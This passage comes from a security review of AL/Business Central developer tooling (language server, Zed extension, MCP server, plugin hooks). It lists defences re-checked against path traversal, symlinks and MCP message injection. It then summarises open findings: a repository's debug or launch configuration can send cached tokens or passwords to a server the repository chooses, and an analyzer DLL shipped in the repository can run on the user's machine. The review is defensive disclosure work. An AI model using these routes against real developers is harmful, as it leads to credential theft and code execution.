  count at 200,000, the manifest at 1 MiB, and reads each stream through `take`, so two
  arbitrary but contained `.app` paths cannot exhaust memory. `app_inspect::safe_join` and the
  `create_new` temp write were re-checked and still refuse traversal and a planted link. These
  held in rounds 2 and 3 and nothing since 2026-09-22 touched them.
- **The emitter's `res/` resource reader** (`al-emit/src/assemble.rs:897-948`).
  `read_project_resource` canonicalises and requires the result to be a regular file under the
  canonical root, and the logo must resolve under `res/`. Tried `..`, an absolute path and a
  `res` symlink target outside: refused. The `.al` source walk beside it is the emitter-symlink
  finding above, a separate reader.
- **`tests.mutate` file allowlist** (`tests_dispatch/mod.rs:60-100`). Each requested file is
  canonicalised, required to be a regular file under the canonical project root, and
  de-duplicated, so a symlink escaping the root is refused before the run.
- **The MCP `instructions` advisory** (`trust.rs:174-217`, `mcp/mod.rs:1333-1339`). It carries
  key names from `ADVISORY_KEYS` and the canonical root only, no repository byte, and every
  other message that quotes repository text goes through `one_line`, which escapes control
  characters and caps length. The round 3 injection is closed and nothing since reintroduced a
  raw value into a message.
- **The plugin hooks and `al-bin.sh`** (`plugin/scripts/*.sh`, `plugin/hooks/hooks.json`). The
  session context is a fixed heredoc with no project value in it, `al-session-end.sh` runs
  `daemon-shutdown` with no interpolated project text, and `al-bin.sh` interpolates no
  project-controlled value: its upward search starts at `CLAUDE_PLUGIN_ROOT`, every expansion
  is quoted, and it ends in `exec "$exe" "$@"`. `jq` reads the payload as an argument. No script
  runs `al-explorer trust`. This matches the round 2 and round 3 findings and the scripts have
  not changed materially since.
- **The extension's executable-path decision** (`src/settings.rs:150-172`,
  `src/lib.rs`). `resolve_server_launch` returns `program: None` and arguments only from
  `al.useOfficialLsp`, so a worktree `binary.path`/`binary.arguments`/debug-adapter path is
  ignored, and `settings_test` pins that with the round 3 payload. `dotnetPath` is the one
  worktree value that still flows, and `trust::enforce_dotnet_path` gates it at every al-lsp
  entry point (daemon, LSP, MCP, DAP compile). The DAP token and analyzer findings above are
  about al-lsp's own consumers, not this extension decision.
- **The release checksum verification** (`src/lib.rs:301-347`, `.github/workflows/release.yml`).
  `verify_extracted_binaries` hashes the extracted `al-lsp` and `al-explorer` against
  `binary-checksums.txt` fetched from the release, refuses a missing digest, and the workflow
  attests `checksums.txt` (which now lists `binary-checksums.txt`) through Sigstore build
  provenance. It is integrity against a broken or swapped download, as the round 1 and round 2
  findings already established. The one gap is that the bridge DLL is outside the hashed set
  (finding above).
- **`collect_al_files` and `is_scanned_path` for the workspace scan and the LSP watcher**
  (`al-source/src/file_index/mod.rs:1116-1161`, `:1075-1105`). Both skip every symlink and the
  hidden/`node_modules`/`.alpackages` directories, and the watcher reads under the generation
  write guard so two events for one file apply in order. The round 4 session review's
  watcher-scope and watcher-order findings are fixed here. The emitter's own walk does not share
  this rule, which is the emitter-symlink finding.

## Review complete

Fourteen findings: 4 high, 4 medium, 6 low (one of the six is a docs-drift item).

The high findings are all one shape the earlier rounds established and this round found still
open in surfaces those rounds did not reach: a file that ships in a cloned repository decides
where a credential goes or what code runs, and the consumer skips the one authorisation
function or the containment the round 2 and 3 fixes built.

1. The Zed debug adapter (`al-lsp --dap`) acquires the cached Business Central token and sends
   it to whatever on-premises server a repository's `.zed/debug.json` names, with no
   `authorize_cached_credential` call, so a cloned repo with one debug scenario harvests the
   token. The daemon's `debug` method gates exactly this and the adapter does not.
2. `tests.run`/`run_batch`/`run_auto` and the Run Test code lens send `BC_USERNAME`/`BC_PASSWORD`
   or `BC_ACCESS_TOKEN` to the server in the repository's first launch configuration, defaulting
   a scheme-less host to `http://`, with no authorisation call, although `publish` was put behind
   one for the same reason.
3. A user's own analyzer name resolves to a DLL the untrusted repository ships (`packages/` and
   `.netpackages/` are searched before the NuGet cache) on every compile path but
   `pack-native --validate`, including the semantic bridge that loads it into the language server
   process, so building or opening a cloned repo runs its analyzer as the user.

File: `Docs/campaign/findings/r4-security.md`
